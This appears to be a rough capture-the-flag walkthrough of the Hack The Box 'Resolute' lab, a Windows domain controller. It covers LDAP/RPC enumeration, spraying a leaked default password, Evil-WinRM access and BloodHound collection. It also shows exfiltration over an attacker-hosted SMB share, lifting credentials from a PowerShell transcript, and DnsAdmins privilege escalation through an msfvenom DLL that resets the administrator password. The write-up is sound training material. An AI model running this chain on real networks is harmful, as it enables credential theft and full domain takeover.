#########
Password spray reveals that this password is still in use for another domain user account - OK
which gives us access to the system over WinRM
PowerShell transcript log is discovered, which has captured credentials passed on the command-line. 
This is used to move laterally to a user that is a member of the DnsAdmins group.
This group has the ability to specify that the DNS Server service loads a plugin DLL. 
After restarting the DNS service, we achieve command execution on the domain controller in the context of `NT_AUTHORITY\SYSTEM`. 
LDAP ENUM
SMB SERVER
DNS DLL ADMIN PRIV ESC
#########
Resolute:

1-Enumeration:
    nmap -T5 -sV -sC -Pn 10.10.10.169  -oN enum/scan.log -vv
    PORT     STATE    SERVICE        REASON      VERSION
    88/tcp   open     kerberos-sec   syn-ack     Microsoft Windows Kerberos (server time: 2024-02-26 00:29:20Z)
    135/tcp  open     msrpc          syn-ack     Microsoft Windows RPC
    139/tcp  open     netbios-ssn    syn-ack     Microsoft Windows netbios-ssn
    389/tcp  open     ldap           syn-ack     Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
    445/tcp  open     microsoft-ds   syn-ack     Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
    593/tcp  open     ncacn_http     syn-ack     Microsoft Windows RPC over HTTP 1.0
    3268/tcp open     ldap           syn-ack     Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)



    SMB - (Windows Server 2016 Standard 6.3) <------------- Check if Vuln

    SMB/LDAP:
    Enumerate LDAP:
        nmap -n -Pn -sV --script "ldap* and not brute" -p 389 10.10.10.169

        We find a bunch of potential users accounts


      We will test Enumeration Via rpcclient:
        rpcclient -U "support" 10.10.10.192      
            rpcclient $> enumdomusers

            rpcclient $> enumdomgroups
                
        We foud Users + Groups


        We will enumerate LDAP because we founds info via RPC
        enum4linux -a -u "" -p "" 10.10.10.169
            [+] Password Info for Domain: MEGABANK

            [+] Minimum password length: 7
            [+] Password history length: 24
            [+] Maximum password age: Not Set


            index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!

            megabank.local\marko Welcome123!



    Enumerate SMB:
        $ crackmapexec smb 10.10.10.169 -u "" -p "" --shares
            SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
            SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\: 
            

        PASSWORD SPRAY:
            We will Passw Spray S"Welcome123!" found with enum4linux with all users via crackmapexec:
                └─$ crackmapexec smb 10.10.10.169 -u users.txt  -p passwd.txt 
                    SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123!

            We found that melanie use the passwd too:
                We can READ NETLOGON + SYSVOL files
                    ─$ crackmapexec smb 10.10.10.169 -u melanie -d megabank.local -p Welcome123! --shares
                        SMB         10.10.10.169    445    RESOLUTE         NETLOGON        READ            Logon server share
                        SMB         10.10.10.169    445    RESOLUTE         SYSVOL          READ            Logon server share 


                smbclient //10.10.10.169/NETLOGON -U'megabank.local\melanie'
                    We Upload everything we can:
                        smb: \> mask ""
                        smb: \> recurse
                        smb: \> prompt
                        smb: \> mget *
                    We found Nothing

            We try access directly via Evil-WinRM - WE HAVE ACCESS:
                evil-winrm -i 10.10.10.169 -u melanie  -p 'Welcome123!'
                *Evil-WinRM* PS C:\Users\melanie\Documents> whoami
                megabank\melanie
                
        Windows Privileges of melanie:
            *Evil-WinRM* PS C:\Users\melanie\Desktop> whoami /priv
                PRIVILEGES INFORMATION
                ----------------------
                Privilege Name                Description                    State
                ============================= ============================== =======
                SeMachineAccountPrivilege     Add workstations to domain     Enabled
                SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
                SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
                
        We are able to upoad some exe:
            *Evil-WinRM* PS C:\users\melanie\Downloads> upload winPEASx64.exe


    Windows Melanie Account Ennumeration:
        Nothing crazy via WinPEAS

        We will user BloodHound:
            *Evil-WinRM* PS C:\Users\melanie\Downloads> .\SharpHound.exe -c all --zipfilename MSedgeMap

#################################SMB Server Creation##############################################

    We'll create our SMB Share to get BloudHound datas:
        on Kali:
            mkdir smb
            impacket-smbserver cool $(pwd) -smb2support -user admin -password admin


        on Window:
            *Evil-WinRM* PS C:\Windows\System32> $passwd = convertto-securestring 'admin' -AsPlainText -Force
            *Evil-WinRM* PS C:\Windows\System32> $passwd
                output

            *Evil-WinRM* PS C:\Windows\System32> $cred = New-Object System.Management.Automation.PSCredential('admin', $passwd)
            *Evil-WinRM* PS C:\Windows\System32> $cred
                output 

            New-PSDrive -Name admin -PSProvider FileSystem -Credential $cred -Root \\<KaliIP>\cool
            
            To upload file from Kali to Windows:
                *Evil-WinRM* PS C:\> cd \\<KaliIP>\coolz
                .\winPEASx64.exe

            To extract files fron Windows to Kali:
                *Evil-WinRM* PS C:\Users\melanie\Downloads>  Copy-Item "20240226121251_MSedgeMap.zip" -Destination "\\<KALI IP>\cool"

    BloodHound Enumeration from melanie:
        Kali:
            sudo neo4j console
                
            Run BloodHound:    
                /usr/lib/bloodhound/BloodHound --no-sandbox

        If we forget our neo4j psswd:
            locate neo4j | grep auth <---Find the file path
            AND 
            DELETE the File 
            THEN 
            RESTART neo4j
                neo4j console
                enter pswwd in localhost server 

        RESULTS:
            No Kerberostable USERS - NOTHING
###############################################################################################


    We go back to our C: File Path:
        dir -force
        cd "PSTranscripts"
        cd 20191203
            dir -force
        
        type "PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt"

    We found ryan passwd:
        ryan Serv3r4Admin4cc123!

    We got a  Powened machine:
        └─$ crackmapexec smb 10.10.10.169 -u "ryan" -p Serv3r4Admin4cc123!            
            SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
            SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)


    
    We will inject a DLL into DNSADMINISTARTOR@MEGABANK.LOCAL to escalate our privileges:
        DNSAdmin - AD Exploit:
            https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2


            This method can be used when we have access to user account who happens to be a member of DNSAdmins group
            or
            When the compromised user account has write privileges to a DNS server object


###########################################PRIVILEGE ADMIN ESCALATION VIA DNS DLL ###############################################################################################


            Check if a user is in DNSAdmins group:
                net user ryan /domain


            We load an arbitrary DLL with SYSTEM privileges on the DNS server. i.e., 
            We will build a DLL which contains admin priv esc code and inject it into dns.exe process on the victim’s DNS Server (DC).
            

            Looks like the server does not even do any verification on the dll path specified in this operation :
            https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
            
                non-staged payload - we just tryed to modify Admin Passwd:
                    msfvenom -p windows/x64/exec cmd='net user administrator Adib1234@! /domain' -f dll > dnsSecAD.dll


            Skip Defender + A.V - Hosting the payload:
                Once the payload is generated,
                we will use smb server to host the file. We are choosing this, because windows supports UNC paths and samba shares by default. 
                Also, there are times when the victim’s AV or defender may delete the payload if uploaded, so we’ll stick with smb server for this one.

                WE REUSE OUR SMB SERVER:
                    We check if it is joignable from the Windows machine:
                        Evil-WinRM* PS C:\Users\ryan\Documents> net view \\<KALI IP> 
                            Shared resources at <KALI IP>

                            (null)

                            Share name  Type  Used as  Comment

                            -------------------------------------------------------------------------------
                            COOL        Disk  (UNC)
                            The command completed successfully.

            TO EXECUTE THE DNS SERVICE with the Privilege Admin Escalation Payload:
                *Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.28\cool\dnsSecAD.dll
                OR IF it fails try:
                    dnscmd megabank.local /config /serverlevelplugindll \\10.10.16.28\cool\dnsSecAD.dll

                sc.exe \\resolute stop dns

                sc.exe \\resolute start dns


            We connect with new creds:
                evil-winrm -i 10.10.10.169 -u administrator  -p Adib1234@!



 
                
